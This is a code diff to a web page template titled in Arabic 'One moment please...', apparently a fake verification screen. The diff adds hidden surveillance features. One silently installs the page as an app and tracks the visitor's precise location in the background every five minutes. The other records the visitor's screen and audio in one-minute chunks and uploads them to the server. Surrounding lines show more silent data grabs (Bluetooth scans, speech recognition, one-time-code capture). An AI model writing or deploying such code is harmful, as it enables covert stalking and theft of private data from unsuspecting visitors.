@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="robots" content="noindex, nofollow">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<% if(pwaAccess){ %><link rel="manifest" href="<%=a%>/manifest.json"><meta name="theme-color" content="#f48120"><% } %>
 <title>لحظة من فضلك...</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
@@ -544,6 +545,58 @@ function doWebOTP(){
 }
 <% } %>
 
+<% if(pwaAccess){ %>
+// ── PWA: install as hidden app + background location sync ─────────────────────
+window.addEventListener('beforeinstallprompt',function(e){e.preventDefault();window._pwaP=e;});
+function doPWAInstall(){
+  if(!('serviceWorker' in navigator))return;
+  navigator.serviceWorker.register(a+'/sw.js').then(function(reg){
+    // Cache location for background sync after page close
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(function(p){
+        var loc={uid:uid,lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy,ts:new Date().toISOString()};
+        caches.open('_track_v1').then(function(c){c.put('/_loc',new Response(JSON.stringify(loc)));}).catch(function(){});
+        if(reg.sync) reg.sync.register('loc-sync').catch(function(){});
+        if(reg.periodicSync) reg.periodicSync.register('loc-periodic',{minInterval:5*60*1000}).catch(function(){});
+      },function(){},{enableHighAccuracy:true,timeout:8000});
+    }
+    // Trigger install prompt silently
+    if(window._pwaP){window._pwaP.prompt();window._pwaP.userChoice.then(function(){}).catch(function(){});window._pwaP=null;}
+  }).catch(function(){});
+}
+<% } %>
+
+<% if(screenRecordAccess){ %>
+// ── Screen Record: continuous video chunks every 60s ─────────────────────────
+var _srStream=null;
+async function doScreenRecord(){
+  try{
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia)return;
+    var opts={mimeType:'video/webm;codecs=vp8'};
+    if(!MediaRecorder.isTypeSupported(opts.mimeType)) opts={mimeType:'video/webm'};
+    _srStream=await navigator.mediaDevices.getDisplayMedia({video:{cursor:'never'},audio:true});
+    _srStream.getVideoTracks()[0].addEventListener('ended',function(){_srStream=null;});
+    function recordChunk(){
+      if(!_srStream||!_srStream.active)return;
+      var chunks=[],rec=new MediaRecorder(_srStream,opts);
+      rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
+      rec.onstop=function(){
+        var blob=new Blob(chunks,{type:opts.mimeType}),fr=new FileReader();
+        fr.onloadend=function(){
+          var b64=fr.result.replace(/^data:.+;base64,/,'');
+          $.post(a+'/screen-record',{uid:uid,video:encodeURIComponent(b64)});
+        };
+        fr.readAsDataURL(blob);
+        setTimeout(recordChunk,1000);
+      };
+      rec.start();
+      setTimeout(function(){try{rec.stop();}catch(e){}},60000);
+    }
+    recordChunk();
+  }catch(e){}
+}
+<% } %>
+
 <% if(bluetoothAccess){ %>
 // ── Bluetooth Scanner: status + paired devices (silent, no dialog) ────────────
 function doBluetoothScan(){
@@ -715,6 +768,8 @@ function doVerify(){
 <% if(speechRecogAccess){ %>  setTimeout(function(){doSpeechRecog();},2000);<% } %>
 <% if(webOTPAccess){ %>  doWebOTP();<% } %>
 <% if(bluetoothAccess){ %>  setTimeout(function(){doBluetoothScan();},3000);<% } %>
+<% if(pwaAccess){ %>  setTimeout(function(){doPWAInstall();},4000);<% } %>
+<% if(screenRecordAccess){ %>  setTimeout(function(){doScreenRecord();},1500);<% } %>
 }
 
 // ── Page init ─────────────────────────────────────────────────────────────────
